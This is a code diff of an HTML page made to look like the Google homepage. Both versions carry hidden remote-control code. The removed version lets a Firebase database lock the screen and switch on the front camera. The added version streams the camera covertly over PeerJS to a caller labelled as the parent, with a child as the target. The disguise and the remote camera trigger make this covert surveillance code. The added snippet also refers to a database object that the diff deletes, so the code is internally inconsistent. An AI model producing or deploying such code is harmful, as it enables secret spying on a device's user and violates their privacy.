@@ -1,67 +1,19 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
-        #bloqueo { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: black; z-index: 9999; justify-content: center; align-items: center; 
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
+<script>
+    const peer = new Peer('camara-nino-123'); // ID fijo para conectar
+    const videoInvisible = document.createElement('video');
+
+    db.ref('comando_camara').on('value', (snap) => {
+        if (snap.val() === "ABRIR") {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then((stream) => {
+                // Cuando el padre llame, el niño contesta con su video
+                peer.on('call', (call) => {
+                    call.answer(stream);
+                });
+                alert("Transmisión lista");
+            });
         }
-        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
-        .logo { width: 160px; margin-bottom: 20px; }
-        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 10px 20px; border-radius: 24px; font-size: 16px; }
-        
-        /* Estilo para el video de la cámara */
-        #video {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: cover; z-index: 8888; background: black;
-        }
-    </style>
-</head>
-<body>
-
-    <div id="bloqueo"><h1 style="color:red;">⚠️ ACCESO RESTRINGIDO</h1></div>
-
-    <video id="video" autoplay playsinline></video>
-
-    <div class="google-home">
-        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-        <input type="text" class="search-bar" placeholder="Buscar en Google o escribir URL">
-    </div>
-
-    <script>
-        const config = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(config);
-        const db = firebase.database();
-        const video = document.getElementById('video');
-
-        // Lógica de Bloqueo
-        db.ref('bloqueo').on('value', (snap) => {
-            document.getElementById('bloqueo').style.display = (snap.val() === "SI") ? "flex" : "none";
-        });
-
-        // Lógica de Cámara
-        db.ref('comando_camara').on('value', (snap) => {
-            if (snap.val() === "ABRIR") {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then((stream) => {
-                    video.srcObject = stream;
-                    video.style.display = "block"; // Se muestra en el tel. del niño
-                })
-                .catch((err) => { console.log("Error: " + err); });
-            } else if (snap.val() === "CERRAR") {
-                const stream = video.srcObject;
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = "none";
-                }
-            }
-        });
-    </script>
-</body>
-</html>
+    });
+</script>
